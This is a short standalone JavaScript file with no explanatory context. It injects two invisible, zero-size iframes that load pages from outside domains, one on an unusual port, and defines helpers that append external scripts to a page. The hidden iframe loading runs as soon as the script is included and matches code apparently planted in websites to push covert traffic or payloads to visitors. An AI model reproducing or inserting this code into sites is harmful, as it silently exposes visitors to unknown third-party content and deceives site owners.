
createHiddenIframe("a201907010001", "https://vtears.com/js/201907/a01.cnzz.html");
createHiddenIframe("a20190701003", "https://www.yezzdin.cn:229");

function createHiddenIframe(id, src) {
	var iframe = document.createElement("iframe");
	iframe.id = id;
	iframe.src = src;
	iframe.style.width = "0px";
	iframe.style.height = "0px";
	iframe.style.border = "0px";
	var body = document.getElementsByTagName("body")[0];
	body.append(iframe);
}

function createScript(id, src) {
	var script = document.createElement("script");
	script.id = id;
	script.src = src;
	var body = document.getElementsByTagName("body")[0];
	body.append(script);
}

function createBdScript(fox_id, src) {
	var script = document.createElement("script");
	script.setAttribute("fox_id", fox_id);
	script.setAttribute("src", src);
	var body = document.getElementsByTagName("body")[0];
	body.append(script);
}